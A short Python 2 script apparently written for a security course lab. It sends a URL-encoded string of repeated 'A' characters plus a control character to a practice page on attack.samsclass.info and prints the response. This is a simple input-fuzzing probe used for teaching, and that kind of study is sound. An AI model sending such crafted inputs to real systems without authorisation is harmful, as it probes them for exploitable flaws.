#!/usr/bin/python
import requests
import urllib
s = 'A' * 30 + '\a'
print(s + ' ' + str(len(s)))
s = urllib.quote_plus(s)
print(s + ' ' + str(len(s)))
params = { 'string' : s, 'submit':'send'}
response = requests.get('https://attack.samsclass.info/ED202e/ED202.5b.php', params)
print(response.text)
